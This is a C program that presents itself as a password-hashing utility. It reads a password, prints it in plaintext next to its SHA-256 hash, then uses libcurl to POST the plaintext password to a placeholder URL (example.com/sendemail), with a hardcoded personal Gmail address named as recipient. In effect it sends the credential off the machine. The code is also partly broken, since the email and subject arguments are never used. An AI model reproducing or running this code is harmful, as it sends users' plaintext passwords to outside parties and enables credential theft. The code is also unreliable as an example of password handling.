#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <openssl/sha.h>
#include <curl/curl.h>

void sha256_hash(const char *input, char *output) {
    unsigned char hash[SHA256_DIGEST_LENGTH];
    SHA256_CTX sha256;

    SHA256_Init(&sha256);
    SHA256_Update(&sha256, input, strlen(input));
    SHA256_Final(hash, &sha256);

    for (int i = 0; i < SHA256_DIGEST_LENGTH; i++) {
        sprintf(output + (i * 2), "%02x", hash[i]);
    }
    output[64] = '\0'; // Null-terminate the output string
}

int sendEmail(const char *email, const char *subject, const char *message) {
    CURL *curl;
    CURLcode res = CURLE_OK;
    const char *server_url = "https://example.com/sendemail"; // Replace with your server URL

    curl = curl_easy_init();
    if (curl) {
        curl_easy_setopt(curl, CURLOPT_URL, server_url);
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, message);

        res = curl_easy_perform(curl);

        if (res != CURLE_OK) {
            fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
            curl_easy_cleanup(curl);
            return 1;
        }

        curl_easy_cleanup(curl);
    }

    return 0;
}

int main() {
    char password[100];
    char hashed_password[65];

    printf("Enter your password: ");
    fgets(password, sizeof(password), stdin);
    password[strcspn(password, "\n")] = '\0';

    sha256_hash(password, hashed_password);

    printf("Original Password: %s\n", password);
    printf("Hashed Password (SHA-256): %s\n", hashed_password);

    char email_subject[] = "Password Information";
    char email_message[200];
    snprintf(email_message, sizeof(email_message), "Original Password: %s\nHashed Password (SHA-256): %s\n", password, hashed_password);

    const char *recipient_email = "angweteryila@gmail.com";

    if (sendEmail(recipient_email, email_subject, email_message) == 0) {
        printf("Email sent successfully.\n");
    } else {
        printf("Failed to send email.\n");
    }

    return 0;
}

